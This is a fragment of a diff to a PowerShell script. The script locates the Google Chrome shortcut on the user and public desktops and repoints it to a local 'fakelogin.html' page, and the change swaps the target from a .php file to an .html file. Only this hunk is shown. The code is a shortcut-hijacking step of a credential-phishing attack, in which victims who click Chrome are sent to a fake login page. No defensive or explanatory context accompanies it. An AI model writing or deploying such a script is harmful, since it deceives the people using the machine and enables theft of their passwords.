@@ -3,7 +3,7 @@ $WshShell = New-Object -ComObject WScript.Shell
 # Define both possible paths where the desktop shortcut could live
 $UserShortcut = "$env:USERPROFILE\Desktop\Google Chrome.lnk"
 $PublicShortcut = "C:\Users\Public\Desktop\Google Chrome.lnk"
-$TargetFile = "file:///C:/Users/kyson/downloads/fakelogin.php"
+$TargetFile = "file:///C:/Users/kyson/downloads/fakelogin.html"
 
 if (Test-Path $UserShortcut) {
     # Modify the shortcut in the personal account folder
